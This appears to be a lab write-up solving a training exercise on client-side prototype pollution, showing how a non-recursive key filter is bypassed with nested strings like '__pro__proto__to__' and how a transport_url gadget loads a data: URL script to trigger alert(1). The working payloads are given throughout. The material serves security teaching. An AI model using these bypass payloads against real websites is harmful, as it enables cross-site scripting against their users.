## Client-side prototype pollution via flawed sanitization

This lab is vulnerable to DOM XSS via client-side prototype pollution. Although the developers have implemented measures to prevent prototype pollution, these can be easily bypassed.

To solve the lab:

1. Find a source that you can use to add arbitrary properties to the global Object.prototype.
2. Identify a gadget property that allows you to execute arbitrary JavaScript.
3. Combine these to call alert().

## Notes

- Search page 
- Possibility to leave a comment
- Feedback feature on /feedback
- /deparamSanitised.js
- /searchLoggerFiltered.js

## Resume

1. Test standard prototype pollution vectors.
2. Observe that sanitization blocks dangerous keys.
3. Review the JavaScript source files.
4. Identify the sanitization bypass.
5. Pollute `Object.prototype`.
6. Find the `transport_url` gadget.
7. Control `script.src`.
8. Use a `data:` URL to trigger `alert(1)`.

## Solve

Open the lab and test a classic prototype pollution payload:

```http
GET /?__proto__.foo=bar
```

Open the browser DevTools console and inspect:

```javascript
Object.prototype
```

Notice that the `foo` property is not added.

Try alternative vectors:

```http
GET /?__proto__[foo]=bar
```

```http
GET /?constructor.prototype.foo=bar
```

Again, inspect:

```javascript
Object.prototype
```

The property is still missing.

This indicates that prototype pollution protections are in place.

Review the loaded JavaScript files and observe:

```text
deparamSanitized.js
searchLoggerFiltered.js
```

The application uses:

```javascript
sanitizeKey()
```

to remove dangerous keys such as:

```text
__proto__
constructor
prototype
```

However, the sanitization is only applied once and is not recursive.

This allows dangerous keys to survive after sanitization by embedding them inside larger strings.

For example:

```http
GET /?__pro__proto__to__[foo]=bar
```

or:

```http
GET /?__pro__proto__to__.foo=bar
```

or:

```http
GET /?constconstructorructor[protoprototypetype][foo]=bar
```

or:

```http
GET /?constconstructorructor.protoprototypetype.foo=bar
```

Inspect the prototype again:

```javascript
Object.prototype
```

You should now see:

```javascript
foo: "bar"
```

Prototype pollution is successful.

Next, identify a gadget.

Review the source code and observe that:

```javascript
searchLogger.js
```

creates a script element dynamically using:

```javascript
config.transport_url
```

No legitimate `transport_url` property exists, making it an ideal gadget.

Pollute the prototype with a custom `transport_url` value:

```http
GET /?__pro__proto__to__[transport_url]=foo
```

Open the Elements panel and inspect the DOM.

A script tag is created:

```html
<script src="foo"></script>
```

This confirms control over:

```javascript
script.src
```

Replace the value with a JavaScript `data:` URL:

```http
GET /?__pro__proto__to__[transport_url]=data:,alert(1);
```

Full exploit:

```text
https://0a3500040419c7b580db039800be0040.web-security-academy.net/?__pro__proto__to__[transport_url]=data:,alert(1);
```

The polluted prototype becomes:

```javascript
Object.prototype.transport_url = "data:,alert(1);"
```

When the page creates the script element:

```javascript
script.src = config.transport_url
```

the browser loads:

```text
data:,alert(1);
```

which executes:

```javascript
alert(1)
```

The alert is triggered and the lab is solved.